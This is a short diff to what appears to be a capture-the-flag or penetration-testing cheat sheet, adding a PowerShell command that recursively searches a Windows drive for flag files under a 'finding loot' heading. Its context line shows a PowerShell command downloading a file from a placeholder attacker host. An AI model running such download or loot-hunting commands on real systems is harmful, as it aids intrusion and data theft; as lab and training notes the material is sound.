@@ -54,6 +54,8 @@ powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://<att
 
 # finding loot - dir - search windows filesystem for file
 dir flag.txt /S /B
+# and in powershell...
+Get-Childitem –Path C:\ -Include *FLAG* -Exclude *.JPG,*.MP3,*.TMP -File -Recurse -ErrorAction SilentlyContinue
 
 # finding loot - find - search linux filesystem for file
 find / -type f -iname flag.txt 2>/dev/null
